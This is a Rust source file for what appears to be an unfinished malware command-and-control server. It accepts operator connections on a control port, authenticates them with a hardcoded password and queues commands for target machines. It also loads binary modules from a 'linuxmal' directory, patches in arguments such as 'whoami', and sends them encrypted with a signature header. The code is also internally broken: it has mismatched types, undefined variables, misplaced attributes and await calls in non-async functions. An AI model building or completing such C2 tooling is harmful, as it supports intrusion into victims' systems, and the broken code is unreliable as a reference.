use crate::GLOBAL_HTTP_LISTENER;
use std::collections::HashMap;
use std::net::{SocketAddr, TcpListener, TcpStream};
use std::sync::{Arc, Mutex};
use std::thread;
use std::io::{Read, Write, Result};
use std::fs::File;
use std::time::Duration;
use actix_web::{get, post, web, App, HttpResponse, HttpServer, Responder};
use serde::{Deserialize, Serialize};

// External ChaCha20 function - you'll need to implement or use a crate
// For now, we'll use a placeholder that just copies data
extern "C" {
    fn chacha20_Full(message: *const u8, buffer: *mut u8, length: u64);
}

const CONTROL_PORT: u16 = 7777;
const HTTP_PORT: u16 = 80;
const BUFFER_SIZE: usize = 4096;
const MAX_MSG_LEN: usize = 256;
const MAX_ID_LEN: usize = 64;

// Define a struct for query parameters
#[derive(Deserialize)]
struct Info {
    value: String,
}


#[derive(Debug, Clone)]
const COMMANDS: [(&str, fn()); 2] = [
    ("TARGET", target_mode),
    ("AUTHEN", authentication_mode),
    ("C2MODE", c2_mode)
];

struct Client {
    stream: TcpStream,
    socket_addr: SocketAddr,
    is_authority: bool,
    target_id: Option<String>,
}

#[derive(Debug)]
struct MessageQueue {
    queues: Arc<Mutex<HashMap<String, Vec<String>>>>,
}

impl MessageQueue {
    fn new() -> Self {
        Self {
            queues: Arc::new(Mutex::new(HashMap::new())),
        }
    }

    fn enqueue(&self, target_id: &str, message: &str) {
        let mut queues = self.queues.lock().unwrap();
        queues
            .entry(target_id.to_string())
            .or_insert_with(Vec::new)
            .push(message.to_string());
        println!("[Server] Stored message for {}: {}", target_id, message);
    }

    fn dequeue(&self, target_id: &str) -> Option<String> {
        let mut queues = self.queues.lock().unwrap();
        if let Some(queue) = queues.get_mut(target_id) {
            if !queue.is_empty() {
                return Some(queue.remove(0));
            }
        }
        None
    }
}

struct ServerState {
    clients: Arc<Mutex<HashMap<u64, Client>>>,
    message_queue: MessageQueue,
    http_listener_active: Arc<Mutex<bool>>,
}

impl ServerState {
    fn new() -> Self {
        Self {
            clients: Arc::new(Mutex::new(HashMap::new())),
            message_queue: MessageQueue::new(),
            http_listener_active: Arc::new(Mutex::new(false)),
        }
    }

    fn add_client(&self, client_id: u64, client: Client) {
        let mut clients = self.clients.lock().unwrap();
        clients.insert(client_id, client);
    }

    fn remove_client(&self, client_id: u64) {
        let mut clients = self.clients.lock().unwrap();
        clients.remove(&client_id);
    }

    fn broadcast_message(&self, message: &str, exclude_client: Option<u64>) {
        let clients = self.clients.lock().unwrap();
        // In a real implementation, you'd send to all connected clients
        // This is simplified for the example
        println!("Broadcasting: {}", message);
        
        for (client_id, client) in clients.iter() {
            if Some(*client_id) != exclude_client {
                if let Err(e) = client.stream.write_all(message.as_bytes()) {
                    eprintln!("Failed to send to client {}: {}", client_id, e);
                }
            }
        }
    }
}

fn bytes_to_hex(buf: &[u8]) -> String {
    buf.iter()
        .map(|b| format!("{:02x}", b))
        .collect::<String>()
}

// commands_modes

// TARGET
fn target_mode(message: &str, mut stream: TcpStream, state: Arc<ServerState>, client_id: u64){}

// AUTHEN
fn authentication_mode(message: &str, mut stream: TcpStream, state: Arc<ServerState>, client_id: u64){

    if command != "1234" {return;}

    // Update client as authority
    {
        let mut clients = state.clients.lock().unwrap();
        if let Some(client) = clients.get_mut(&client_id) {
            client.is_authority = true;
        }
    }

}


//C2MODE
fn c2_mode(message: &str, mut stream: TcpStream, state: Arc<ServerState>, client_id: u64){
    
    match message {
        "hstart" => {
            {
                let mut listener = GLOBAL_HTTP_LISTENER.lock().unwrap();

                if listener.start("127.0.0.1:8080").await.is_ok() {
                    let _ = stream.write_all(b"HTTP listener started\n");
                } else {
                    let _ = stream.write_all(b"Failed to start HTTP listener\n");
                }
            }
        },
        "hstop" => {
            {
                let listener = GLOBAL_HTTP_LISTENER.lock().unwrap();

                // stop() returns (), so we don’t check a Result here
                listener.stop().await;
                let _ = stream.write_all(b"HTTP listener stopped\n");
            }
        },
        _ => {}
    }
}

// commands_modes

fn load_module(module: &str, size: &mut usize) -> Option<Vec<u8>> {
    let parts: Vec<&str> = module.splitn(2, ' ').collect();
    let (module_name, argument_str) = match parts.as_slice() {
        [name, args] => (*name, *args),
        [name] => (*name, "whoami"),
        _ => return None,
    };

    // Load binary file
    let path = format!("D:/linuxmal/modules/bin/{}.bin", module_name);
    let mut file = match File::open(&path) {
        Ok(file) => file,
        Err(e) => {
            eprintln!("[-] Failed to open {}: {}", path, e);
            return None;
        }
    };

    let mut file_buffer = Vec::new();
    if let Err(e) = file.read_to_end(&mut file_buffer) {
        eprintln!("[-] Failed to read file: {}", e);
        return None;
    }

    // Replace placeholder with arguments
    let placeholder = b"0xFFFFFFFF";
    if let Some(pos) = file_buffer
        .windows(placeholder.len())
        .position(|window| window == placeholder)
    {
        let arg_bytes = argument_str.as_bytes();
        let replace_len = arg_bytes.len().min(placeholder.len());
        file_buffer[pos..pos + replace_len].copy_from_slice(&arg_bytes[..replace_len]);
    }

    // Encrypt the file content (placeholder - use actual ChaCha20)
    let mut encrypted_data = file_buffer.clone();
    unsafe {
        chacha20_Full(
            file_buffer.as_ptr(),
            encrypted_data.as_mut_ptr(),
            file_buffer.len() as u64,
        );
    }

    // Create payload with signature
    let mut full_payload = Vec::with_capacity(8 + encrypted_data.len());
    full_payload.extend_from_slice(b"NSLM55IM");
    full_payload.extend_from_slice(&encrypted_data);

    *size = full_payload.len();
    println!("[+] Sent signature and encrypted binary ({} bytes).", encrypted_data.len());

    Some(full_payload)
}

fn handle_http_connections(state: Arc<ServerState>) -> Result<()> {

    // Simple GET handler
    #[get("/")]
    async fn index(query: web::Query<Info>) -> impl Responder {
        let value = &query.value;
        state.broadcast_message(&broadcast_msg, None);
        //HttpResponse::Ok().body(format!("Im alive: {}", value))
    }

    
}

fn handle_client(mut stream: TcpStream, state: Arc<ServerState>, client_id: u64) -> Result<()> {
    let client_addr = stream.peer_addr()?;
    println!("New client connected: {}", client_addr);

    let client = Client {
        stream: stream,
        socket_addr: client_addr,
        is_authority: false,
        target_id: None,
    };
    state.add_client(client_id, client);

    let mut buffer = [0u8; BUFFER_SIZE];
    
    loop {
        match stream.read(&mut buffer) {
            Ok(0) => break, // Connection closed
            Ok(bytes_received) => {
                let message = String::from_utf8_lossy(&buffer[..bytes_received]);
                let message = message.trim_end_matches(|c| c == '\r' || c == '\n');

                let commands_mode: String = message.chars().take(6).collect();

                if let Some((_, func)) = COMMANDS.iter().find(|(name, _)| *name == commands_mode) {

                    func(&message[7..], stream, state, client_id);
                }
                
                // } else if message.starts_with("TARGET:") {
                //     let parts: Vec<&str> = message[7..].splitn(2, ':').collect();
                //     if parts.len() == 2 {
                //         let target_id = parts[0];
                //         let msg = parts[1];
                        
                //         state.message_queue.enqueue(target_id, msg);
                //         let _ = stream.write_all(b"command enqueued wait for response\n");
                //     } else {
                //         println!("[Server] Invalid message format: {}", message);
                //     }
                // } else {
                //     // Broadcast regular message
                //     let broadcast_msg = format!("CLIENT_{}: {}", client_id, message);
                //     state.broadcast_message(&broadcast_msg, Some(client_id));
                // }
            }
            Err(e) => {
                eprintln!("Error reading from client {}: {}", client_id, e);
                break;
            }
        }
    }

    state.remove_client(client_id);
    println!("Client {} disconnected", client_id);
    Ok(())
}

fn main() -> Result<()> {
    let state = Arc::new(ServerState::new());
    
    // Start control server
    let control_listener = TcpListener::bind(("0.0.0.0", CONTROL_PORT))?;
    println!("Server running on port {}", CONTROL_PORT);
    
    let mut client_counter = 0u64;
    
    for stream in control_listener.incoming() {
        match stream {
            Ok(stream) => {
                let state_clone = Arc::clone(&state);
                let current_client_id = client_counter;
                client_counter += 1;
                
                thread::spawn(move || {
                    if let Err(e) = handle_client(stream, state_clone, current_client_id) {
                        eprintln!("Error handling client {}: {}", current_client_id, e);
                    }
                });
            }
            Err(e) => eprintln!("Connection failed: {}", e),
        }
        
        // Small delay to prevent overwhelming the system
        thread::sleep(Duration::from_millis(10));
    }
    
    Ok(())
}

// Placeholder implementation for ChaCha20 - replace with actual implementation
#[no_mangle]
pub extern "C" fn chacha20_Full(message: *const u8, buffer: *mut u8, length: u64) {
    unsafe {
        std::ptr::copy_nonoverlapping(message, buffer, length as usize);
    }
}